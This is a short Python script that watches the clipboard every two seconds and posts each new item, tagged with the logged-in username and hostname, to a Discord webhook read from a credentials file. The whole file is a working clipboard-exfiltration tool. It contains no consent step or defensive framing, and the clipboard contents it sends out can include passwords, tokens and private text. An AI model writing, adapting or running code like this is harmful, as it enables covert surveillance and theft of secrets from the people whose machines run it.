import pyperclip
import time
import requests
import json
import os
import socket

# Get the username of the currently logged-in user
username = os.getlogin()

# Get the hostname of the computer
hostname = socket.gethostname()
with open("credentials.json", "r") as f:
    credentials = json.load(f)

WEBHOOK_URL = credentials["discord_webhook"]["clipboard_webhook_url"]

# Variable to store the previous clipboard content
previous_content = ""

# Monitor clipboard every 2 seconds
try:
    while True:
        print("Monitoring clipboard...")
        clipboard_data = pyperclip.paste()
        # Check if the clipboard content is new
        if clipboard_data and clipboard_data != previous_content:
            payload = {"content": f"Clipboard Data coming from {username} ({hostname}): {clipboard_data}"}
            try:
                requests.post(WEBHOOK_URL, json=payload)
                print(f"Sent new clipboard data: {clipboard_data}")
                previous_content = clipboard_data  # Update previous content
            except Exception as e:
                print(f"Error sending to Discord: {e}")
        time.sleep(2)
except KeyboardInterrupt:
    
    print("Clipboard monitoring stopped.")